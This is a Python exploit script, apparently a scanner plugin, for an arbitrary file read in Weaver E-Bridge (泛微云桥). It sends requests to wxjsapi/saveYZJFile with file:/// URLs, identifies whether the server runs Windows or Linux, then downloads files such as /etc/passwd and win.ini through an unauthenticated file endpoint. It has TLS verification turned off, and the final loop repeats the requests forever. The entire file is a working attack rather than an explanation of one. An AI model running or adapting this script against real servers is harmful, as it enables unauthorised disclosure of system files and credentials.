import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import re
import sys

# 判断操作系统 or 判断漏洞是否可利用
def check(target_url):
    vuln_url_1 = target_url + "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt"
    vuln_url_2 = target_url + "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
    vuln_url_3 = target_url + "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///&fileExt=txt"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response_1 = requests.get(url=vuln_url_1, headers=headers, verify=False, timeout=5)
        response_2 = requests.get(url=vuln_url_2, headers=headers, verify=False, timeout=5)
        response_3 = requests.get(url=vuln_url_3, headers=headers, verify=False, timeout=5)
        if "无法验证您的身份" in response_1.text and "无法验证您的身份" in response_2.text:
            print(Vcolors.WARNING + "[x] 不存在泛微云桥任意文件读取漏洞" + Vcolors.ENDC)
            return None, None
        else:
            if "No such file or directory" in response_1.text:
                print(Vcolors.RED + "[?] 目标为LUNIX\r" + Vcolors.ENDC)
                id = re.findall(r'"id":"(.*?)"', response_3.text)[0]
                print(Vcolors.RED + "[+] 成功获取id: {}".format(id) + Vcolors.ENDC)
                return id, "linux"
            elif "系统找不到指定的路径" in response_2.text:
                print(Vcolors.RED + "[+] 目标为Windows" + Vcolors.ENDC)
                id = re.findall(r'"id":"(.*?)"', response_1.text)[0]
                print(Vcolors.RED + "[+] 成功获取id: {}".format(id) + Vcolors.ENDC)
                return id, "windows"

            else:
                print(Vcolors.WARNING + "[x] 不存在泛微云桥任意文件读取漏洞" + Vcolors.ENDC)
                return None, None

    except Exception as e:
        return None, None


# 验证漏洞
def POC_2(target_url, id):
    file_url = target_url + "file/fileNoLogin/{}".format(id)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=file_url, headers=headers, verify=False, timeout=10)
        response.encoding = 'GBK'
        print(Vcolors.RED + "[!] 成功读取: {}".format(response.text) + Vcolors.ENDC)
    except Exception as e:
        pass


# windows 文件读取
def POC_3(target_url):
    file_url = target_url + "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C://windows/win.ini&fileExt=txt"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=file_url, headers=headers, verify=False, timeout=10)
        id = re.findall(r'"id":"(.*?)"', response.text)[0]
        print(Vcolors.RED + "[!] 成功获取id: {}".format(id) + Vcolors.ENDC)
        POC_2(target_url, id)
    except:
        pass


# linux读取文件
def POC_4(target_url):
    file_url = target_url + "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=file_url, headers=headers, verify=False, timeout=10)
        id = re.findall(r'"id":"(.*?)"', response.text)[0]
        print(Vcolors.RED + "[!] 成功获取id: {}".format(id) + Vcolors.ENDC)
        POC_2(target_url, id)
    except:
        pass

def E_Bridge_Arbitrary_File_Read(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    try:
        id, system = check(urldata)
        if id is None:
            pass
        else:
            POC_2(urldata, id)
            while True:
                if system == "windows":
                    POC_3(urldata)
                if system == "linux":
                    POC_4(urldata)
    except Exception as e:
        logging.error("E_Bridge_Arbitrary_File_Read脚本出现异常")
  
        


